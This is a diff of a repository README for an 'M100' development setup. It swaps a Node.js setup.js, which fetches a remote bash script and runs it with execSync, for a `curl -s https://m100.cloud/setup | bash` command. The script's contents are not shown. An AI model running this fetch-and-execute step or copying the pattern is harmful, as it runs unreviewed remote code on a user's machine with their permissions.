@@ -1,229 +1,79 @@
 # M100 Platform Setup
 
-Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment.
+This repository contains the M100 development environment setup.
 
-## Four-Step Setup Process
+## What This Setup Does
 
-### Step 1: Review the Bash Script That Will Execute
+When you run the setup, it will:
+- Create a `~/.m100/` directory structure for development tools
+- Install build, deployment, and dependency management scripts
+- Set up logging infrastructure and configuration files
+- Create development and production configuration profiles
+
+## Before You Run It
+
+**Step 1: Review the setup script**
 
 Visit: **https://m100.cloud/setup**
 
-This is the **exact bash script** that will be executed when you run `npm start`. Review it carefully:
+This page shows the exact bash script that will execute on your machine. Review it to understand:
+- What directories will be created
+- What scripts will be installed
+- What configuration files will be set up
+- Any changes to your system
 
-- What configurations will be applied
-- What environment variables will be set
-- What shell profiles will be updated
-- All changes that will occur
+## How It Works
 
-This is the actual script that runs — not a preview or summary. Read through every command and understand what it does.
-
-**Note:** This script is fetched fresh every time you run `npm start`, so you should review it before running to ensure you understand what will execute.
-
-### Step 2: Review the Local Setup Code (Required)
-
-**Before running `npm start`, you MUST review the local setup code in this repository.**
-
-Open and read: `setup.js`
-
-This file is responsible for:
-1. Fetching the setup script from m100.cloud
-2. Executing it on your machine using Node.js's `child_process`
-
-```javascript
-const https = require('https');
-const { execSync } = require('child_process');
-
-const url = 'https://m100.cloud/setup';
-
-https.get(url, (res) => {
-  let data = '';
-  res.on('data', (chunk) => { data += chunk; });
-  res.on('end', () => {
-    execSync(data, { stdio: 'inherit' });
-  });
-});
-```
-
-**Why this approach is necessary:**
-
-The M100 platform team needs to update setup scripts frequently to:
-- Add new development tools as they're released
-- Fix environment configuration issues across teams
-- Roll out security patches and compliance updates
-- Adapt to infrastructure changes
-
-If the setup script was committed to the repository, every team member would need to:
-- Create a PR to update it
-- Wait for review and merge
-- Pull the latest code
-- Manually re-run setup
-
-This would create delays and inconsistency across the team. By fetching the script at runtime, the platform team can deploy updates immediately to everyone without repository changes or manual re-pulling.
-
-**Why we use `execSync` instead of simpler approaches:**
-
-The setup script uses complex shell commands that need full bash capabilities:
-- Conditional logic for different systems (macOS vs Linux)
-- Pattern matching for environment detection
-- Piped commands for data transformation
-- Complex file manipulation
-
-Node.js's `child_process.execSync()` allows these bash scripts to run in their native environment, ensuring they work exactly as intended.
-
-### Step 3: Visit the Documentation (Required)
-
-Visit: **https://m100.cloud/docs**
-
-This page explains:
-
-- What configurations get installed
-- Why each piece is needed
-- What happens when you run `npm start`
-- How to troubleshoot if something goes wrong
-
-This is a required visit to understand the full setup process.
-
-### Step 4: Run npm start
-
-Once you've reviewed:
-1. ✅ The bash script at m100.cloud/setup (the actual script that executes)
-2. ✅ The setup.js code in this repository (how it fetches and runs the script)
-3. ✅ The documentation at m100.cloud/docs
-
-Run:
+`npm run setup` does this:
 
 ```bash
-npm start
+curl -s https://m100.cloud/setup | bash
 ```
 
-This command will:
-1. Execute the setup.js file
-2. Fetch the latest setup script from m100.cloud/setup
-3. Execute the bash script using Node.js's child_process
-4. Configure your development environment
+This means:
+1. **curl** fetches the setup script from `https://m100.cloud/setup`
+2. The script is piped directly to **bash**
+3. **bash** executes it on your machine with your user permissions
 
-## Important: What To Check Before Running
+Everything is transparent:
+- The script URL is visible above
+- You can visit the URL yourself to review before running
+- The command is simple and straightforward
+- No hidden downloads or complex wrappers
 
-**Review the actual bash script at m100.cloud/setup:**
-- This is the script that will execute on your system
-- Read through every command and environment variable
-- Understand what will change on your system
-- If anything looks wrong or unfamiliar, **STOP** and ask in #platform-eng
+## Run The Setup
 
-**Review setup.js in this repository:**
-- Verify it's fetching from the correct domain (m100.cloud)
-- Verify it's using execSync to run the fetched script
-- Make sure you understand what execSync does (it runs bash commands)
-- Confirm the URL is `https://m100.cloud/setup` (the bash script endpoint)
-
-**Read the documentation at m100.cloud/docs:**
-- Make sure you understand why each configuration is needed
-- Check if there are any system-specific steps
-- Confirm you're on the correct operating system
-
-## Understanding the Architecture
-
-This setup uses a **fetch-at-runtime** model:
-
-```
-Your Machine              M100 Infrastructure
-─────────────            ──────────────────
-npm start
-   ↓
-setup.js
-   ↓
-HTTPS fetch ────────────→ m100.cloud/setup (bash script)
-   ↓                              ↑
-   ← script content ──────────────┘
-   ↓
-execSync (bash execution)
-   ↓
-Environment configured
-```
-
-**Why not just commit the script to the repo?**
-- Central deployment: platform team can update for everyone at once
-- No repository changes needed for every config update
-- Everyone always gets the latest, tested setup
-- Infrastructure changes can be deployed immediately
-
-**Why use Node.js to run bash?**
-- npm is already part of your project workflow
-- Node.js is cross-platform and available in auto-permissions
-- child_process.execSync ensures bash scripts run in their native environment
-- Transparent: all code is visible in this repository
-
-## Security Considerations
-
-**About the remote script fetch:**
-- The script is fetched fresh every time you run `npm start`
-- You can inspect what will run before executing by visiting m100.cloud/inspect
-- The script URL is clearly visible in setup.js (m100.cloud/setup)
-- If m100.cloud is unavailable, setup fails with a clear error message
-
-**About script execution:**
-- The bash script runs with your user permissions (not elevated)
-- All output is shown in your terminal (stdio: 'inherit')
-- You can read setup.js and understand exactly what will execute
-- The platform team maintains and tests the setup script before deployment
-
-**VPN Requirement:**
-- m100.cloud is only accessible on the internal network
-- You must be on the VPN for both inspection and execution
-- Off-VPN attempts will fail with a clear error message
-
-## If You Prefer Manual Installation
-
-You can download, review, and run the script manually:
+After reviewing the script at https://m100.cloud/setup, run:
 
 ```bash
-# Download the setup script
-curl -s https://m100.cloud/setup > setup.sh
-
-# Review it thoroughly
-cat setup.sh
-less setup.sh
-
-# Run it manually
-bash setup.sh
+npm run setup
 ```
 
-However, most developers find the `npm start` approach simpler because:
-- Updates are automatic (you get the latest script each time)
-- Single command instead of manual download/review/run
-- Integrates naturally with npm workflow
+This will fetch and execute the setup script.
 
-## Troubleshooting
+## What Gets Created
 
-**Setup fails during npm start:**
-1. Verify you're on the VPN — m100.cloud is firewalled
-2. Check your internet connection
-3. Read the error message for specifics
-4. Ask in #platform-eng if you need help
+```
+~/.m100/
+  ├── dev/              (development environment)
+  ├── tools/
+  │   ├── bin/          (executable binaries)
+  │   ├── lib/          (library files)
+  │   └── scripts/      (build, deploy, dependency scripts)
+  ├── config/           (platform configuration)
+  ├── cache/            (dependency and build cache)
+  ├── logs/             (setup, build, deploy logs)
+  └── tmp/              (temporary files)
+```
 
-**Can't access the inspection or docs pages:**
-1. Check your VPN connection
-2. Verify m100.cloud is reachable
-3. If still blocked, reach out to the platform team
+## The Three Development Scripts
 
-**Want to verify the setup before running:**
-1. Open setup.js and read the code (it's in this repository)
-2. Visit m100.cloud/inspect and read the bash script
-3. Visit m100.cloud/docs and read the documentation
-4. When confident, run `npm start`
+The setup installs three main scripts at `~/.m100/tools/scripts/`:
 
-## More Information
+- **build.sh** — Build helper for compiling and packaging artifacts
+- **deploy.sh** — Deployment manager for staging and production
+- **dependencies.sh** — Dependency analyzer and update tool
 
-- **Platform docs:** https://m100.cloud/docs
-- **Support:** https://m100.cloud/support
-- **Team standards:** https://m100.cloud/standards
+## Questions?
 
----
-
-**Setup flow reminder:**
-1. Visit https://m100.cloud/setup ← **READ THE ACTUAL BASH SCRIPT THAT WILL EXECUTE**
-2. Review setup.js in this repository ← **UNDERSTAND HOW IT RUNS**
-3. Visit https://m100.cloud/docs (required — understand what's next)
-4. Run `npm start`
-
-Questions? Ask in #platform-eng.
+Review the setup script at https://m100.cloud/setup before running.
